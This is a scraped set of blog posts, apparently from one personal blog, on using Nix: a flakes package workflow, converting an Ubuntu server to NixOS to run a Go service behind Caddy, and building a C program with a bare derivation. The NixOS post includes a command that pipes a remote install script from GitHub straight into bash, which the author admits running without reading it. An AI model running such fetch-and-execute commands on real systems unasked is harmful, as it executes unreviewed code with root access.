this is how I wanted my setup to work so that’s what I did. \n\n Here’s the  nix-symlink  script. The  rm flake.lock  is because of that relative path issue,\nand the  NIXPKGS_ALLOW_UNFREE  is so I could install ngrok. \n\n #!/bin/bash\n\nset -euo pipefail\n\nexport NIXPKGS_ALLOW_UNFREE=1\ncd ~/work/nixpkgs/flakes/grapefruit || exit\nrm flake.lock\nnix build --impure --out-link ~/.nix-flake\n \n\n I put  ~/.nix-flake  at the beginning of my  PATH  (not at the end), but I might revisit that, we’ll see. \n\n a note on GC roots \n\n At the end of all this, I wanted to run a garbage collection because I’d\ninstalled a bunch of random stuff that was taking about 20GB of extra hard\ndrive space in my  /nix/store . I think there are two different ways to collect\ngarbage in nix: \n\n \n nix-store --gc \n nix-collect-garbage \n \n\n I have no idea what the difference between them is, but  nix-collect-garbage \nseemed to delete more stuff for some reason. \n\n I wanted to check that my  ~/.nix-flake  directory was actually a GC root, so\nthat all my stuff wouldn’t get deleted when I ran a GC. \n\n I ran  nix-store --gc --print-roots  to print out all the GC roots and my\n ~/.nix-flake  was in there so everything was good! This command also runs a GC\nso it was kind of a dangerous way to check if a GC was going to delete\neverything, but luckily it worked. \n\n problem 6: it’s a little slow \n\n The last problem I ran into is speed. Previously, installing a new small package took me 2 seconds with  nix-env -iA : \n\n $ time nix-env -iA nixpkgs.sl\ninstalling 'sl-5.05'\nthese 2 paths will be fetched (0.41 MiB download, 3.77 MiB unpacked):\n  /nix/store/yv1c98m5pncx3i5q7nr7i7mfjkiyii72-ncurses-6.4\n  /nix/store/2k78vf30czicjs0dq9x0sj4017ziwxkn-sl-5.05\ncopying path '/nix/store/yv1c98m5pncx3i5q7nr7i7mfjkiyii72-ncurses-6.4' from 'https://cache.nixos.org'...\ncopying path '/nix/store/2k78vf30czicjs0dq9x0sj4017ziwxkn-sl-5.05' from 'https://cache.nixos.org'...\nbuilding '/nix/store/zadpfs9k1cw5x7iniwwcqd8lb7nnc7bb-user-environment.drv'...\n\n________________________________________________________\nExecuted in    1.96 secs      fish           external\n \n\n Installing the same package with flakes takes 7 seconds, plus the time to edit the config file: \n\n $ vim ~/work/nixpkgs/flakes/grapefruit/flake.nix\n$ time nix-symlink\n________________________________________________________\nExecuted in    7.04 secs    fish           external\n   usr time    1.78 secs    0.29 millis    1.78 secs\n   sys time    0.51 secs    2.03 millis    0.51 secs\n \n\n I don’t know what to do about this so I’ll just live with it. We’ll see if\nthis ends up being annoying or not \n\n that’s it! \n\n Now my new nix workflow is: \n\n \n edit my  flake.nix  to add or remove packages ( this file ) \n rerun my  nix-symlink  script after editing it \n maybe periodically run  nix-collect-garbage \n that’s it \n \n\n setting up the nix registry \n\n The last thing I wanted to do was run \n\n nix registry add nixpkgs github:NixOS/nixpkgs/nixpkgs-23.05-darwin\n \n\n so that if I want to ad-hoc run a flake with  nix run nixpkgs#cowsay , it’ll\ntake the version from the 23.05 version of nixpkgs. Mostly I just wanted this\nso I didn’t have to download new versions of the nixpkgs repository all the\ntime – I just wanted to pin the 23.05 version. \n\n I think  nixpkgs-unstable  is the default which I’m sure is fine too if you\nwant to have more up-to-date software. \n\n my solutions are probably not the best \n\n My solutions to all the nix problems I described are maybe not The Best ™,\nbut I’m happy that I figured out a way to install stuff that just involves one\nrelatively simple  flake.nix  file and a 6-line bash script and not a lot of other\nmachinery. \n\n Personally I still feel extremely uncomfortable with nix and so\nit’s important to me to keep my configuration as simple as possible without a\nlot of extra abstraction layers that I don’t understand. I might try out\n flakey-profile  at some point though\nbecause it seems extremely simple. \n\n you can do way fancier stuff \n\n You can manage a lot more stuff with nix, like: \n\n \n your npm / ruby / python / etc packages (I just do  npm install  and  pip install  and  bundle install ) \n your config files \n \n\n There are all kind of tools that build on top of nix and flakes like\n home-manager . Like I said\nbefore though, it’s important to me to keep my configuration super simple so that I\ncan have any hope of understanding how it works and being able to fix problems\nwhen it breaks so I haven’t paid attention to any of that stuff. \n\n there’s a useful discord \n\n I’ve been complaining about nix a little in this post, but as usual with open source\nprojects I assume that nix has all of these papercuts because it’s a\ncomplicated system run by a small team of volunteers with very limited time. \n\n Folks on the  unofficial nix discord  have been\nhelpful, I’ve had a somewhat mixed experience there but they have a “support\nforum” section in there and I’ve gotten answers to a lot of my questions. \n\n some other nix resources \n\n the main resources I’ve found for understanding nix flakes are: \n\n \n Nix Flakes, Part 1: An introduction and tutorial , I think by their creator \n xe iaso’s blog \n ian henry’s blog \n the nix docs \n zero to nix \n \n\n Also Kamal (my partner) uses nix and that really helps, I think using nix with\nan experienced friend around is a lot easier. \n\n that’s all! \n\n I still kind of like nix after using it for 9 months despite how confused I am\nabout it all the time, I feel like once I get things working they don’t usually\nbreak. \n\n We’ll see if that’s continues to be the case with flakes! Maybe I’ll go back to\njust using  nix-env -iA ing everything if it goes badly. \n\n"},
{"url": "https://jvns.ca/blog/2024/01/01/some-notes-on-nixos/", "title": "Some notes on NixOS", "content": "\n     \n\n Hello! Over the holidays I decided it might be fun to run NixOS on one of my\nservers, as part of my continuing experiments with Nix. \n\n My motivation for this was that previously I was using  Ansible  to\nprovision the server, but then I’d ad hoc installed a bunch of stuff on the\nserver in a chaotic way separately from Ansible, so in the end I had no real\nidea of what was on that server and it felt like it would be a huge pain to\nrecreate it if I needed to. \n\n This server just runs a few small personal Go services, so it seemed like a\ngood candidate for experimentation. \n\n I had trouble finding explanations of how to set up NixOS and I needed to\ncobble together instructions from a bunch of different places, so here’s a\nvery short summary of what worked for me. \n\n why NixOS instead of Ansible? \n\n I think the reason NixOS feels more reliable than Ansible to me is that NixOS  is \nthe operating system. It has full control over all your users and services and\npackages, and so it’s easier for it to reliably put the system into the state\nyou want it to be in. \n\n Because Nix has so much control over the OS, I think that if I tried to make\nany ad-hoc changes at all to my Nix system, Nix would just blow them away the\nnext time I ran  nixos-rebuild . But with Ansible, Ansible only controls a few\nsmall parts of the system (whatever I explicitly tell it to manage), so it’s\neasy to make changes outside Ansible. \n\n That said, here’s what I did to set up NixOS on my server and run a Go service on it. \n\n step 1: install NixOS with nixos-infect \n\n To install NixOS, I created a new Hetzner instance running Ubuntu, and then ran  nixos-infect  on it to convert the Ubuntu installation into a NixOS install, like this: \n\n curl https://raw.githubusercontent.com/elitak/nixos-infect/master/nixos-infect | PROVIDER=hetznercloud NIX_CHANNEL=nixos-23.11 bash 2>&1 | tee /tmp/infect.log\n \n\n I originally tried to do this on DigitalOcean, but it didn’t work for some\nreason, so I went with Hetzner instead and that worked. \n\n This isn’t the only way to install NixOS ( this wiki page  lists options for setting up NixOS cloud servers), but it seemed to work.\nIt’s possible that there are problems with installing that way that I don’t\nknow about though. It does feel like using an ISO is probably better because that way you don’t have to do this transmogrification of Ubuntu into NixOS. \n\n I definitely skipped Step 1 in  nixos-infect ’s README (“Read and understand\n the script ”), but I didn’t feel too worried because I was running it on a\nnew instance and I figured that if something went wrong I’d just delete it. \n\n step 2: copy the generated Nix configuration \n\n Next I needed to copy the generated Nix configuration to a new local Git\nrepository, like this: \n\n scp root@SERVER_IP:/etc/nixos/* .\n \n\n This copied 3 files:  configuration.nix ,  hardware-configuration.nix , and  networking.nix .  configuration.nix  is the main file. I didn’t touch anything in  hardware-configuration.nix  or  networking.nix . \n\n step 3: create a flake \n\n I created a flake to wrap  configuration.nix . I don’t remember why I did this\n(I have some idea of what the advantages of flakes are, but it’s not clear to\nme if any of them are actually relevant in this case) but it seems to work. Here’s\nmy  flake.nix : \n\n { inputs.nixpkgs.url = \"github:NixOS/nixpkgs/23.11\";\n\n  outputs = { nixpkgs, ... }: {\n    nixosConfigurations.default = nixpkgs.lib.nixosSystem {\n      system = \"x86_64-linux\";\n\n      modules = [ ./configuration.nix ];\n    };\n  };\n}\n \n\n The main gotcha about flakes that I needed to remember here was that you need\nto  git add  every  .nix  file you create otherwise Nix will pretend it doesn’t\nexist. \n\n The rules about git and flakes seem to be: \n\n \n you do need to  git add  your files \n you  don’t  need to commit your changes \n unstaged changes to files are also fine, as long as the file has been  git add ed \n \n\n These rules feel very counterintuitive to me (why require that you  git add \nfiles but allow unstaged changes?) but that’s how it works. I think it might be\nan optimization because Nix has to copy all your  .nix  files to the Nix store for some\nreason, so only copying files that have been  git add ed makes the copy faster. There’s a  GitHub issue tracking it here  so maybe the way this works will change at some point. \n\n step 4: figure out how to deploy my configuration \n\n Next I needed to figure out how to deploy changes to my configuration.  There are a bunch\nof tools for this, but I found the blog post  Announcing nixos-rebuild: a “new” deployment tool for NixOS \nthat said you can just use the built-in  nixos-rebuild , which has\n --target-host  and  --build-host  options so that you can specify which host\nto build on and deploy to, so that’s what I did. \n\n I wanted to be able to get Go repositories and build the Go code on the target\nhost, so I created a bash script that runs this command: \n\n nixos-rebuild switch --fast --flake .#default --target-host my-server --build-host my-server --option eval-cache false\n \n\n Making  --target-host  and  --build-host  the same machine is certainly not\nsomething I would do for a Serious Production Machine, but this server is\nextremely unimportant so it’s fine. \n\n This  --option eval-cache false  is because Nix kept not showing me my errors\nbecause they were cached – it would just say  error: cached failure of\nattribute 'nixosConfigurations.default.config.system.build.toplevel'  instead\nof showing me the actual error message. Setting  --option eval-cache false \nturned off caching so that I could see the error messages. \n\n Now I could run  bash deploy.sh  on my laptop and deploy my configuration to the server! Hooray! \n\n step 5: update my ssh config \n\n I also needed to set up a  my-server  host in my  ~/.ssh/config . I set up SSH\nagent forwarding so that the server could download the private Git repositories\nit needed to access. \n\n Host my-server\n   Hostname MY_IP_HERE\n   User root\n   Port 22\n   ForwardAgent yes\n\nAddKeysToAgent yes\n \n\n step 6: set up a Go service \n\n The thing I found the hardest was to figure out how to compile and configure a\nGo web service to run on the server. The norm seems to be to define your package and define your\nservice’s configuration in 2 different files, but I didn’t feel like doing that\n– I wanted to do it all in one file. I couldn’t find a simple example of how\nto do this, so here’s what I did. \n\n I’ve replaced the actual repository name with  my-service  because it’s a\nprivate repository and you can’t run it anyway. \n\n { pkgs ? (import <nixpkgs> { }), lib, stdenv, ... }: \nlet myservice = pkgs.callPackage pkgs.buildGoModule {\n  name = \"my-service\";\n  src = fetchGit {\n    url = \"git@github.com:jvns/my-service.git\";\n    rev = \"efcc67c6b0abd90fb2bd92ef888e4bd9c5c50835\"; # put the right git sha here\n  };\n  vendorHash = \"sha256-b+mHu+7Fge4tPmBsp/D/p9SUQKKecijOLjfy9x5HyEE\"; # nix will complain about this and tell you the right value\n}; in { \n  services.caddy.virtualHosts.\"my-service.example.com\".extraConfig = ''\n    reverse_proxy localhost:8333\n  '';\n\n  systemd.services.my-service = {\n    enable = true;\n    description = \"my-service\";\n    after = [\"network.target\"];\n    wantedBy = [\"multi-user.target\"];\n    script = \"${myservice}/bin/my-service\";\n    environment = {\n      DB_FILENAME = \"/var/lib/my-service/db.sqlite\";\n    };\n    serviceConfig = {\n      DynamicUser = true;\n      StateDirectory = \"my-service\"; # /var/lib/my-service\n    };\n  };\n}\n \n\n Then I just needed to do 2 more things: \n\n \n add  ./my-service.nix  to the imports section of  configuration.nix \n add  services.caddy.enable = true;  to  configuration.nix  to enable Caddy \n \n\n and everything worked!! \n\n Some notes on this service configuration file: \n\n \n I used  extraConfig  to configure Caddy because I didn’t feel like learning\nNix’s special Caddy syntax – I wanted to just be able to refer to the Caddy\ndocumentation directly. \n I used systemd’s  DynamicUser  to create a user dynamically to run the\nservice. I’d never used this before but it seems like a great simple way to\ncreate a different user for every service without having to write a bunch of\nrepetitive boilerplate and being really careful to choose unique UID and\nGIDs. The blog post  Dynamic Users with systemd  talks\nabout how it works. \n I used  StateDirectory  to get systemd to create a persistent directory where I could store a SQLite database. It creates a directory at  /var/lib/my-service/ \n \n\n I’d never heard of  DynamicUser  or  StateDirectory  before Kamal told me about\nthem the other day but they seem like cool systemd features and I wish\nI’d known about them earlier. \n\n why Caddy? \n\n One quick note on  Caddy : I switched to Caddy a while back from nginx\nbecause it automatically sets up Let’s Encrypt certificates. I’ve only been\nusing it for tiny hobby services, but it seems pretty great so far for that,\nand its configuration language is simpler too. \n\n problem: “fetchTree requires a locked input” \n\n One problem I ran into was this error message: \n\n error: in pure evaluation mode, 'fetchTree' requires a locked input, at «none»:0\n \n\n I found this really perplexing – what is  fetchTree ? What is  «none»:0 ? What did I do wrong? \n\n I learned 4 things from debugging this (with help from the folks in the Nix discord): \n\n \n In Nix,  fetchGit  calls an internal function called  fetchTree . So errors that say  fetchTree  might actually be referring to  fetchGit . \n Nix truncates long stack traces by default. Sometimes you can get more information with  --show-trace . \n It seems like Nix doesn’t always give you the line number in your code which caused the error, even if you use  --show-trace . I’m not sure why this is. Some people told me this is because  fetchTree  is a built in function but – why can’t I see the line number in my nix code that  called  that built in function? \n Like I mentioned before, you can pass  --option eval-cache false  to turn off caching so that Nix will always show you the error message instead of  error: cached failure of attribute 'nixosConfigurations.default.config.system.build.toplevel' \n \n\n Ultimately the problem turned out to just be that I forgot to pass the Github\nrevision ID ( rev = \"efcc67c6b0abd90fb2bd92ef888e4bd9c5c50835\"; ) to  fetchGit \nwhich was really easy to fix. \n\n nix syntax is still pretty confusing to me \n\n I still don’t really understand the nix language syntax that well, but I\nhaven’t felt motivated to get better at it yet – I guess learning new language\nsyntax just isn’t something I find fun. Maybe one day I’ll learn it. My plan\nfor now with NixOS is to just keep copying and pasting that  my-service.nix \nfile above forever. \n\n some questions I still have \n\n I think my main outstanding questions are: \n\n \n When I run  nixos-rebuild , Nix checks that my systemd services are still\nworking in some way. What does it check exactly? My best guess is that it\nchecks that the systemd service  starts  successfully, but if the service\nstarts and then immediately crashes, it won’t notice. \n Right now to deploy a new version of one of my services, I need to manually\ncopy and paste the Git SHA of the new revision. There’s probably a better\nworkflow but I’m not sure what it is. \n \n\n that’s all! \n\n I really do like having all of my service configuration defined in one file,\nand the approach Nix takes does feel more reliable than the approach I was\ntaking with Ansible. \n\n I just started doing this a week ago and as with all things Nix I have no idea\nif I’ll end up liking it or not. It seems pretty good so far though! \n\n I will say that I find using Nix to be very difficult and I really struggle\nwhen debugging Nix problems (that  fetchTree  problem I mentioned sounds\nsimple, but it was SO confusing to me at the time), but I kind of like it\nanyway. Maybe because I’m not using Linux on my laptop right now I miss having\n linux evenings  and Nix feels\nlike a replacement for that :) \n\n"},
{"url": "https://jvns.ca/blog/2023/03/03/how-do-nix-builds-work-/", "title": "How do Nix builds work?", "content": "\n     \n\n Hello! For some reason after the last  nix post  I got nerdsniped by trying to understand how Nix builds\nwork under the hood, so here’s a quick exploration I did today. There are probably some mistakes in here. \n\n I started by  complaining on Mastodon : \n\n \n are there any guides to nix that start from the bottom up (for example\nstarting with  this bash script \nand then working up the layers of abstraction) instead of from the top down? \n\n all of the guides I’ve seen start by describing the nix programming language\nor other abstractions, and I’d love to see a guide that starts with concepts I\nalready understand like compiler flags, linker flags, Makefiles, environment\nvariables, and bash scripts \n \n\n Ross Light wrote a great blog post in response called  Connecting Bash to Nix , that shows how to compile a basic C program without using most of Nix’s standard machinery. \n\n I wanted to take this a tiny bit further and compile a slightly more\ncomplicated C program. \n\n the goal: compile a C program, without using Nix’s standard machinery \n\n Our goal is to compile a C program called  paperjam . This is a real C program\nthat wasn’t in the Nix repository already. I already figured out how to\ncompile it in  this post  by copying and pasting a bunch of stuff I didn’t understand, but this time I wanted to do\nit in a more principled way where I actually understand more of the steps. \n\n We’re going to avoid using most of Nix’s helpers for compiling C programs. \n\n The plan is to start with an almost empty build script, and then resolve errors\nuntil we have a working build. \n\n first: what’s a derivation? \n\n I said that we weren’t going to talk about too many Nix abstractions (and we won’t!), but understanding what a derivation is really helped me. \n\n Everything I read about Nix talks about derivations all the time, but I was\nreally struggling to figure out what a derivation  is . It turns out that  derivation \nis a function in the Nix language. But not just any function! The whole point of the Nix language seems to be to\nto call this function. The  official documentation for the  derivation  function  is actually extremely clear. Here’s what I took away: \n\n derivation  takes a bunch of keys and values as input. There are 3 required keys: \n\n \n system : the system, for example  x86_64-darwin \n name : the name of the package you’re building \n builder : a program (usually a bash script) that runs the build \n \n\n Every other key is an arbitrary string that gets passed as an environment\nvariable to the  builder  shell script. \n\n derivations automatically build all their inputs \n\n A derivation doesn’t just call a shell script though! Let’s say I reference another derivation called  pkgs.qpdf  in my script. \n\n Nix will: \n\n \n automatically build the  qpdf  package \n put the resulting output directory somewhere like  /nix/store/4garxzr1rpdfahf374i9p9fbxnx56519-qpdf-11.1.0 \n expand  pkgs.qpdf  into that output directory (as a string), so that I can reference it in my build script \n \n\n The derivation function does some other things (described in the\n documentation ), but “it builds all of its inputs” is all we really need to know\nfor now. \n\n step 1: write a derivation file \n\n Let’s write a very simple build script and call the  derivation  function. These don’t work yet,\nbut I found it pretty fun to go through all the errors, fix them one at a time,\nand learn a little more about how Nix works by fixing them. \n\n Here’s the build script ( build_paperjam.sh ). This just unpacks the tarball and runs  make install . \n\n #!/bin/bash\n\ntar -xf \"$SOURCE\"\ncd paperjam-1.2 \nmake install\n \n\n And here’s the Nix code calling the  derivation  function (in  paperjam.nix ). This calls the core  derivation  function, without too much magic. \n\n let pkgs = import (fetchTarball \"https://github.com/NixOS/nixpkgs/archive/4d2b37a84fad1091b9de401eb450aae66f1a741e.tar.gz\") {};\n\nbuiltins.derivation {\n  name = \"paperjam-fake\";\n  builder = ./build-paperjam.sh;\n  system = builtins.currentSystem;\n\n  SOURCE = pkgs.fetchurl {\n    url = \"https://mj.ucw.cz/download/linux/paperjam-1.2.tar.gz\";\n    hash = \"sha256-0AziT7ROICTEPKaA4Ub1B8NtIfLmxRXriW7coRxDpQ0\";\n  };\n\n}\n \n\n The main things here are: \n\n \n fetchurl  (which downloads an url and puts the path in to the  SOURCE  environment variable) \n pkgs  (which lets us depend on other Nix packages from the central repository). I don’t totally understand this but I’m already in a pretty deep rabbit hole so we’re going to leave that for now. \n \n\n SOURCE  evaluates to a string – it’s the path to the downloaded source tarball. \n\n problem 1:  tar: command not found \n\n Nix needs you to declare all the dependencies for your builds. It forces this\nby removing your  PATH  environment variable so that you have no binaries in\nyour PATH at all. \n\n This is pretty easy to fix: we just need to edit our  PATH . \n\n I added this to  paperjam.nix  to get  tar ,  gzip , and  make : \n\n   PATH = \"${pkgs.gzip}/bin:${pkgs.gnutar}/bin:${pkgs.gnumake}/bin\";\n \n\n problem 2: we need a compiler \n\n Next, we had this error: \n\n g++ -O2 -Wall -Wextra -Wno-parentheses -std=gnu++11 -g -DVERSION='\"1.2\"' -DYEAR='\"2022\"' -DBUILD_DATE='\"\"' -DBUILD_COMMIT='\"\"'   -c -o paperjam.o paperjam.cc\nmake: g++: No such file or directory\n \n\n So we need to put a compiler in our PATH. For some reason I felt like using  clang++  to compile, not  g++ . To do that I need to make 2 changes to  paperjam.nix : \n\n \n Add the line  CXX=\"clang++\"; \n Add  ${pkgs.clang}/bin  to my  PATH \n \n\n problem 3: missing header files \n\n The next error was: \n\n  > ./pdf-tools.h:13:10: fatal error: 'qpdf/QPDF.hh' file not found\n > #include <qpdf/QPDF.hh>\n \n\n Makes sense: everything is isolated, so it can’t access my system header files.\nFiguring out how to handle this was a little more confusing though. \n\n It turns out that the way Nix handles header files is that it has a shell\nscript wrapper around  clang . So when you run  clang++ , you’re actually\nrunning a shell script. \n\n On my system, the  clang++  wrapper script was at  /nix/store/d929v59l9a3iakvjccqpfqckqa0vflyc-clang-wrapper-11.1.0/bin/clang++ . I searched that file for  LDFLAGS  and found that it uses 2 environment variables: \n\n \n NIX_LDFLAGS_aarch64_apple_darwin \n NIX_CFLAGS_COMPILE_aarch64_apple_darwin \n \n\n So I figured I needed to put all the arguments to clang in the  NIX_CFLAGS  variable and all the linker arguments in  NIX_LDFLAGS . Great! Let’s do that. \n\n I added these 2 lines to my  paperjam.nix , to link the  libpaper  and  qpdf  libraries: \n\n NIX_LDFLAGS_aarch64_apple_darwin = \"-L ${pkgs.qpdf}/lib   -L ${pkgs.libpaper}/lib\";\nNIX_CFLAGS_COMPILE_aarch64_apple_darwin = \"-isystem ${pkgs.qpdf}/include   -isystem ${pkgs.libpaper}/include\";\n \n\n And that worked! \n\n problem 4: missing  c++abi \n\n The next error was: \n\n > ld: library not found for -lc++abi\n \n\n Not sure what this means, but I searched for “abi” in the Nix packages and fixed it by adding  -L ${pkgs.libcxxabi}/lib  to my  NIX_LDFLAGS  environment variable. \n\n problem 5: missing iconv \n\n Here’s the next error: \n\n > Undefined symbols for architecture arm64:\n>   \"_iconv\", referenced from: ...\n \n\n I started by adding  -L ${pkgs.libiconv}/lib  to my  NIX_LDFLAGS  environment variable, but that didn’t fix it. Then I spent a while going around in circles and being confused. \n\n I eventually figured out how to fix this by taking a working version of the  paperjam  build that I’d made before\nand editing my  clang++  wrapper file to print out all of its environment\nvariables. The  LDFLAGS  environment variable in the working version was different from mine: it had  -liconv  in it. \n\n So I added  -liconv  to  NIX_LDFLAGS  as well and that fixed it. \n\n why doesn’t the original Makefile have  -liconv ? \n\n I was a bit puzzled by this  -liconv  thing though: the original Makefile links\nin  libqpdf  and  libpaper  by passing  -lqpdf -lpaper . So why doesn’t it link in iconv, if it requires the\niconv library? \n\n I think the reason for this is that the original Makefile assumed that you were\nrunning on Linux and using glibc, and glibc includes these iconv functions by\ndefault. But I guess Mac OS libc doesn’t include iconv, so we need to\nexplicitly set the linker flag  -liconv  to add the iconv library. \n\n problem 6: missing  codesign_allocate \n\n Time for the next error: \n\n libc++abi: terminating with uncaught exception of type std::runtime_error: Failed to spawn codesign_allocate: No such file or directory\n \n\n I guess this is some kind of Mac code signing thing. I used  find /nix/store -name codesign_allocate  to find  codesign_allocate  on my system. It’s at\n /nix/store/a17dwfwqj5ry734zfv3k1f5n37s4wxns-cctools-binutils-darwin-973.0.1/bin/codesign_allocate . \n\n But this doesn’t tell us what the package is called – we need to be able to refer to it as  ${pkgs.XXXXXXX}  and  ${pkgs.cctools-binutils-darwin}  doesn’t work. \n\n I couldn’t figure out a way go from a Nix folder to the name of the package, but I ended up poking around and finding out that it was called  pkgs.darwin.cctools . \n\n So I added  ${pkgs.darwin.cctools}/bin  to the  PATH . \n\n problem 7: missing  a2x \n\n Easy, just add  ${pkgs.asciidoc}/bin  to the  PATH . \n\n problem 8: missing  install \n\n make: install: No such file or directory\n \n\n Apparently  install  is a program? This turns out to be in  coreutils , so we add  ${pkgs.coreutils}/bin  to the  PATH . Adding  coreutils  also fixes some other warnings I was seeing about missing commands like  date . \n\n problem 9: can’t create /usr/local/bin/paperjam \n\n This took me a little while to figure out because I’m not very familiar with make. The Makefile has a  PREFIX  of  /usr/local , but we want it to be the program’s output directory in  /nix/store/ \n\n I edited the  build-paperjam.sh  shell script to say: \n\n make install PREFIX=\"$out\"\n \n\n and everything worked! Hooray! \n\n our final configuration \n\n Here’s the final  paperjam.nix . It’s not so different from what we started with – we just added 4 environment variables. \n\n let pkgs = import (fetchTarball \"https://github.com/NixOS/nixpkgs/archive/ae8bdd2de4c23b239b5a771501641d2ef5e027d0.tar.gz\") {};\nin\n\nbuiltins.derivation {\n  name = \"paperjam-fake\";\n  builder = ./build-paperjam.sh;\n  system = builtins.currentSystem;\n\n  SOURCE = pkgs.fetchurl {\n    url = \"https://mj.ucw.cz/download/linux/paperjam-1.2.tar.gz\";\n    hash = \"sha256-0AziT7ROICTEPKaA4Ub1B8NtIfLmxRXriW7coRxDpQ0\";\n  };\n\n  CXX=\"clang++\";\n  PATH = \"${pkgs.gzip}/bin:${pkgs.gnutar}/bin:${pkgs.gnumake}/bin:${pkgs.clang}/bin:${pkgs.darwin.cctools}/bin:${pkgs.asciidoc}/bin:${pkgs.coreutils}/bin:${pkgs.bash}/bin\";\n  NIX_LDFLAGS_aarch64_apple_darwin = \"-L ${pkgs.qpdf}/lib   -L ${pkgs.libpaper}/lib -L ${pkgs.libcxxabi}/lib -liconv -L ${pkgs.libiconv}/lib \";\n  NIX_CFLAGS_COMPILE_aarch64_apple_darwin = \"-isystem ${pkgs.qpdf}/include   -isystem ${pkgs.libpaper}/include\";\n}\n \n\n And here’s the final  build-paperjam.sh  build script. Here we just needed to edit the  make install  line to set the  PREFIX . \n\n #!/bin/bash\n\ntar -xf \"$SOURCE\"\ncd paperjam-1.2\nmake install PREFIX=\"$out\"\n \n\n let’s look at our compiled derivation! \n\n Now that we understand this configuration a little better, let’s talk about\nwhat  nix-build  is doing a little more. \n\n Behind the scenes,  nix-build paperjam.nix  actually runs  nix-instantiate  and  nix-store --realize : \n\n $ nix-instantiate paperjam.nix\n/nix/store/xp8kibpll55s0bm40wlpip51y7wnpfs0-paperjam-fake.drv\n$ nix-store --realize /nix/store/xp8kibpll55s0bm40wlpip51y7wnpfs0-paperjam-fake.drv\n \n\n I think what this means is that  paperjam.nix  get compiled to some\nintermediate representation (also called a derivation?), and then the Nix\nruntime takes over and is in charge of actually running the build scripts. \n\n We can look at this  .drv  intermediate representation with  nix show-derivation \n\n {\n  \"/nix/store/xp8kibpll55s0bm40wlpip51y7wnpfs0-paperjam-fake.drv\": {\n    \"outputs\": { \"out\": { \"path\": \"/nix/store/bcnyqizvcysqc1vy382wfx015mmwn3bd-paperjam-fake\" }\n    },\n    \"inputSrcs\": [ \"/nix/store/pbjj91f0qr8g14k58m744wdl9yvr2f5k-build-paperjam.sh\" ],\n    \"inputDrvs\": {\n      \"/nix/store/38sikqcggyishxbgi2xnyrdsnq928gqx-asciidoc-10.2.0.drv\": [ \"out\" ],\n      \"/nix/store/3llc749f9pn0amlb9vgwsi22hin7kmz4-libcxxabi-11.1.0.drv\": [ \"out\" ],\n      \"/nix/store/a8ny8lrbpyn15wdxk3v89f4bdr08a38a-libpaper-1.1.28.drv\": [ \"out\" ],\n      \"/nix/store/d888pj9lll12s5qx11v850g1vd4h3vxq-cctools-port-973.0.1.drv\": [ \"out\" ],\n      \"/nix/store/gkpdv7xl39x9yxch0wjarq19mmv7j1pm-bash-5.2-p15.drv\": [ \"out\" ],\n      \"/nix/store/hwx16m7hmkp2rcik8h67nnyjp52zj849-gnutar-1.34.drv\": [ \"out\" ],\n      \"/nix/store/kqqwffajj24fmagxqps3bjcbrglbdryg-gzip-1.12.drv\": [ \"out\" ],\n      \"/nix/store/lnrxa45bza18dk8qgqjayqb65ilfvq2n-qpdf-11.2.0.drv\": [ \"out\" ],\n      \"/nix/store/rx7a5401h44dqsasl5g80fl25jqqih8r-gnumake-4.4.drv\": [ \"out\" ],\n      \"/nix/store/sx8blaza5822y51abdp3353xkdcbkpkb-coreutils-9.1.drv\": [ \"out\" ],\n      \"/nix/store/v3b7r7a8ipbyg9wifcqisf5vpy0c66cs-clang-wrapper-11.1.0.drv\": [ \"out\" ],\n      \"/nix/store/wglagz34w1jnhr4xrfdk0g2jghbk104z-paperjam-1.2.tar.gz.drv\": [ \"out\" ],\n      \"/nix/store/y9mb7lgqiy38fbi53m5564bx8pl1arkj-libiconv-50.drv\": [ \"out\" ]\n    },\n    \"system\": \"aarch64-darwin\",\n    \"builder\": \"/nix/store/pbjj91f0qr8g14k58m744wdl9yvr2f5k-build-paperjam.sh\",\n    \"args\": [],\n    \"env\": {\n      \"CXX\": \"clang++\",\n      \"NIX_CFLAGS_COMPILE_aarch64_apple_darwin\": \"-isystem /nix/store/h25d99pd3zln95viaybdfynfq82r2dqy-qpdf-11.2.0/include   -isystem /nix/store/agxp1hx267qk1x79dl4jk1l5cg79izv1-libpaper-1.1.28/include\",\n      \"NIX_LDFLAGS_aarch64_apple_darwin\": \"-L /nix/store/h25d99pd3zln95viaybdfynfq82r2dqy-qpdf-11.2.0/lib   -L /nix/store/agxp1hx267qk1x79dl4jk1l5cg79izv1-libpaper-1.1.28/lib -L /nix/store/awkb9g93ci2qy8yg5jl0zxw46f3xnvgv-libcxxabi-11.1.0/lib -liconv -L /nix/store/nmphpbjn8hhq7brwi9bw41m7l05i636h-libiconv-50/lib \",\n      \"PATH\": \"/nix/store/90cqrp3nxbcihkx4vswj5wh85x5klaga-gzip-1.12/bin:/nix/store/siv9312sgiqwsjrdvj8lx0mr3dsj3nf5-gnutar-1.34/bin:/nix/store/yy3fdgrshcblwx0cfp76nmmi24szw89q-gnumake-4.4/bin:/nix/store/cqag9fv2gia03nzcsaygan8fw1ggdf4g-clang-wrapper-11.1.0/bin:/nix/store/f16id36r9xxi50mgra55p7cf7ra0x96k-cctools-port-973.0.1/bin:/nix/store/x873pgpwqxkmyn35jvvfj48ccqav7fip-asciidoc-10.2.0/bin:/nix/store/vhivi799z583h2kf1b8lrr72h4h3vfcx-coreutils-9.1/bin:/nix/store/0q1jfjlwr4vig9cz7lnb5il9rg0y1n84-bash-5.2-p15/bin\",\n      \"SOURCE\": \"/nix/store/6d2fcw88d9by4fz5xa9gdpbln73dlhdk-paperjam-1.2.tar.gz\",\n      \"builder\": \"/nix/store/pbjj91f0qr8g14k58m744wdl9yvr2f5k-build-paperjam.sh\",\n      \"name\": \"paperjam-fake\",\n      \"out\": \"/nix/store/bcnyqizvcysqc1vy382wfx015mmwn3bd-paperjam-fake\",\n      \"system\": \"aarch64-darwin\"\n    }\n  }\n}\n \n\n This feels surprisingly easy to understand – you can see that there are a\nbunch of environment variables, our bash script, and the paths to our inputs. \n\n the compilation helpers we’re not using:  stdenv \n\n Normally when you build a package with Nix, you don’t do all of this stuff\nyourself. Instead, you use a helper called  stdenv , which seems to have two parts: \n\n \n a function called  stdenv.mkDerivation  which takes some arguments and generates a bunch of environment variables (it seems to be  documented here ) \n a 1600-line bash build script ( setup.sh ) that consumes those environment variables. This is like our  build-paperjam.sh , but much more generalized. \n \n\n Together, these two tools: \n\n \n add  LDFLAGS  automatically for each C library you depend on \n add  CFLAGS  automatically so that you can get your header files \n run  make \n depend on clang and coreutils and bash and other core utilities so that you don’t need to add them yourself \n set  system  to your current system \n let you easily add custom bash code to run at various phases of your build \n maybe also manage versions somehow? Not sure about this one. \n \n\n 